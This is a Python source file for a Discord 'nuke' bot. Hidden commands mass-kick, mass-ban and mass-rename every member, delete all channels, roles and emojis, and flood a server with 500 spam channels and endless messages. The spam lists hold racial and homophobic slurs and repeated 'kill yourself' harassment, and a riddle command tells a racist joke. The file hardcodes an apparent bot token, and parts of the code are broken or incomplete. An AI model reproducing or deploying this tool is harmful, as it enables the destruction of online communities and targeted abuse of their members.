# Made by Decayer177

import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix='$', intents=intents)
# Sets prefix and intents

client.remove_command("help")


@client.event
async def on_message(message):
    if "nuke" in message.content.lower():
        await message.delete()
    await client.process_commands(message)


@client.event
async def on_ready():
    print("Ah shit, here we go again Bot's online.")


@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))


client.event


async def on_message(message):
    if "LeWeeb" in message.content.lower():
        await message.delete()
    await client.process_commands(message)
####HELP COMMAND####


@client.command(pass_context=True)
async def secretsex(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour=discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(
        name='Kall',
        value='Kicks every member in a server',
        inline=False)
    embed.add_field(
        name='Ball',
        value='Bans every member in a server',
        inline=False)
    embed.add_field(
        name='Rall',
        value='Renames every member in a server',
        inline=False)
    embed.add_field(
        name='Mall',
        value='Messages every member in a server',
        inline=False)
    embed.add_field(
        name='Destroy',
        value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order',
        inline=False)
    embed.add_field(
        name='Ping',
        value='Gives ping to client (expressed in MS)',
        inline=False)
    embed.add_field(
        name='Info',
        value='Gives information of a user',
        inline=False)
    embed.add_field(
        name='Chinese secret weapon',
        value='The ultimate weapon of destruction',
        inline=False)
    await member.send(embed=embed)
#############################

####KALL COMMAND####


@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print(f"{member.name} has been kicked")
        except BaseException:
            print(f"{member.name} has FAILED to be kicked")
        print("Action completed: Kick all")
#############################

####BALL COMMAND####


@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
        except BaseException:
            pass
    print("Action completed: Ban all")
#############################

####RALL COMMAND####


@client.command(pass_context=True)
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print(f"{member.name} has been renamed to {rename_to}")
        except BaseException:
            print(f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####


@client.command(pass_context=True)
async def mall(ctx, args):
    if args is None:
        await ctx.send("Since u dint use a args imma use default command")
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        await member.send("getnukedlmaoo")
        if args:
            for member in list(client.get_all_members()):
                await asyncio.sleep(2)
                await member.send(args)


#############################
@client.command()
async def complexdestruction(ctx):
	    message = await ctx.send('so you really want to execute this command?')
	    message
        


async def checkforcommand(ctx):
    yes = ""
    no = ""
    valid_reactions = ['', '']


def check(reaction, user):
    return user == ctx.author and str(reaction.emoji) in valid_reactions

async def doingstuff(ctx):
    reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=check)
    if str(reaction.emoji) == yes:
       print("h")
###DESTROY COMMAND####


@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(channel.name + " has been deleted")
        except BaseException:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Xd get fucked bitch ðŸ¤¡")
        await channel.send("@everyone leave server or get hacked ðŸ¤¡")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print(f"{role.name} has been deleted")
        except BaseException:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
        except BaseException:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted")
        except BaseException:
            pass
    print("Action completed: Nuclear Destruction")
#############################

####PING COMMAND####


@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed = discord.Embed(
        title=None,
        description='Ping: {}'.format(
            round(
                (t2 - t1) * 1000)),
        color=0x2874A6)
    await ctx.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####


@client.command(pass_context=True)
async def info(ctx, member: discord.Member = None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################

######SKULL COMMAND######


@client.command(pass_context=True)
async def skull(ctx):
    await ctx.message.delete()
    await ctx.send('ðŸ’€')

#############################


@client.command()
async def offline(ctx):
    bot.change_presence(status=discord.Status.invisible)
#######RIDDLE COMMAND######


@client.command(pass_context=True)
async def riddle(ctx):
    await ctx.send('Allright then')
    await asyncio.sleep(1)
    await ctx.send('Riddle me this')
    await asyncio.sleep(3)
    await ctx.send('I am loud and obnoxious')
    await asyncio.sleep(2)
    await ctx.send('I like music that rhymes')
    await asyncio.sleep(2)
    await ctx.send('I am a fraction of the population, but commit half the crimes')
    await asyncio.sleep(3)
    await ctx.send('Now, Who am I?')


#########################################

#######CHINESE GOVERNMENT SECRET WEAPON PARTS####

SPAM_CHANNEL = [
    "kenballs",
    "kenbaka",
    "ball",
    "aaaa ",
    "ken",
    "ken",
    "Get beamed faggots",
    "Beamed by Yeltsa ðŸ¤¡",
    "oops got nuked ðŸ‘¾",
    "Leave server or get hacked",
    " lolicons are pigs ",
    "cry about it ðŸ¤¡",
    "xd moment",
    "KYS NOW!!"]
SPAM_MESSAGE = [
    "@everyone KYS NOW YOU LOLI CON FUCKS",
    "@here THANOS WAS RIGHT YOU SHOULDVE DIED",
    "@KILL YOURSELF NOW!",
    "@here FUCK YOUR GORE LOVING ASS KYS NOW",
    "YELTSA KCIR THE POWER OF EREN NIGGER"]


@client.command()
async def testingthebot(ctx, args):
    await ctx.send(args)


@client.command()
async def nukingthenuker(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        print("I have given everyone admin")
    except BaseException:
        print(Fore.GREEN + "I was unable to give everyone admin")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} was deleted.")
        except BaseException:
            print("{channel.name} was NOT deleted.")
    for member in guild.members:
        try:
            await member.ban()
            print("{member.name}#{member.discriminator} Was banned")
        except BaseException:
            print("{member.name}#{member.discriminator} Was unable to be banned.")
    for role in guild.roles:
        try:
            await role.delete()
            print("{role.name} Has been deleted")
        except BaseException:
            print("{role.name} Has not been deleted")
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print("{emoji.name} Was deleted")
        except BaseException:
            print("{emoji.name} Wasn't Deleted")
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("ð˜ð¨ð®ð«_ð”ð¬ðžð«")
            print("{user.name}#{user.discriminator} Was successfully unbanned.")
        except BaseException:
            print("{user.name}#{user.discriminator} Was not unbanned.")
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


###############################


client.run("OTM0ODQ4ODY4MjI1NTMyMDE0.Ye2D2g.aUe6vvHVJ1V0CpVH3TPlA8XsTEo")
# Place your Bot's token here
